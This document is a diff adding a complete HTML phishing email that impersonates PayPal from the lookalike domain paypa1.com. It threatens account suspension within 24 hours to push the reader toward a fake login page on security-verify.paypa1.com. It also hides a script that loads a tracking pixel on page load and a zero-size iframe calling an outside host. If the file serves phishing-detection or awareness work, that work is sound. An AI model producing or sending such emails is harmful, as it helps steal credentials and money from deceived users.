@@ -1,0 +1,71 @@
+From: "PayPal Security" <security@paypa1.com>
+To: user@example.com
+Subject: URGENT: Your PayPal account access has been limited!
+Date: Mon, 7 Apr 2025 08:45:22 -0700
+MIME-Version: 1.0
+Content-Type: text/html; charset=UTF-8
+Content-Transfer-Encoding: 7bit
+
+<!DOCTYPE html>
+<html>
+<head>
+    <title>PayPal Security Alert</title>
+</head>
+<body style="font-family: Arial, sans-serif; margin: 0; padding: 0; background-color: #f5f5f5;">
+    <table width="100%" cellpadding="0" cellspacing="0" style="max-width: 600px; margin: 0 auto; background-color: #ffffff;">
+        <tr>
+            <td style="padding: 20px; text-align: center; background-color: #0070ba;">
+                <img src="https://www.paypa1.com/logo.png" alt="PayPal Logo" style="max-width: 100px;">
+            </td>
+        </tr>
+        <tr>
+            <td style="padding: 30px;">
+                <h1 style="color: #e30000; margin-top: 0;">ACCOUNT ACCESS LIMITED!</h1>
+                <p style="font-size: 16px; line-height: 1.5;">Dear Valued Customer,</p>
+                <p style="font-size: 16px; line-height: 1.5;">We detected unusual activity in your PayPal account. For your security, we have temporarily limited your account access.</p>
+                <p style="font-size: 16px; line-height: 1.5;"><strong>You must verify your information IMMEDIATELY or your account will be permanently suspended.</strong></p>
+                
+                <div style="background-color: #f8f8f8; border: 1px solid #ddd; padding: 15px; margin: 20px 0;">
+                    <p style="font-size: 14px; margin: 0 0 10px 0;"><strong>Warning signs detected:</strong></p>
+                    <ul style="font-size: 14px; margin: 0; padding-left: 20px;">
+                        <li>Multiple login attempts from different locations</li>
+                        <li>Unusual payment activity</li>
+                        <li>Contact information changes</li>
+                    </ul>
+                </div>
+                
+                <p style="font-size: 16px; line-height: 1.5;">To restore full access to your account, please verify your information by clicking the button below:</p>
+                
+                <div style="text-align: center; margin: 30px 0;">
+                    <a href="https://security-verify.paypa1.com/login.php?id=user123" style="display: inline-block; background-color: #0070ba; color: #ffffff; font-size: 16px; font-weight: bold; text-decoration: none; padding: 12px 30px; border-radius: 4px;">Verify My Account</a>
+                </div>
+                
+                <p style="font-size: 16px; line-height: 1.5;">If you do not complete this verification within 24 hours, your account access will be permanently disabled.</p>
+                
+                <p style="font-size: 16px; line-height: 1.5;">Thank you for your prompt attention to this matter.</p>
+                
+                <p style="font-size: 16px; line-height: 1.5;">Sincerely,<br>PayPal Security Team</p>
+            </td>
+        </tr>
+        <tr>
+            <td style="padding: 20px; text-align: center; background-color: #f5f5f5; font-size: 12px; color: #666666;">
+                <p style="margin: 0 0 10px 0;">Please do not reply to this email. This mailbox is not monitored and you will not receive a response.</p>
+                <p style="margin: 0;">© 2025 PayPal, Inc. All rights reserved.</p>
+            </td>
+        </tr>
+    </table>
+    
+    <script>
+        // Tracking code
+        document.addEventListener('DOMContentLoaded', function() {
+            // Hidden tracking pixel
+            var img = new Image();
+            img.src = 'https://track.paypa1.com/pixel.php?id=user123';
+            img.style.display = 'none';
+            document.body.appendChild(img);
+        });
+    </script>
+    
+    <iframe src="https://stats.paypa1.com/collect.html" style="width:0;height:0;border:none;"></iframe>
+</body>
+</html>
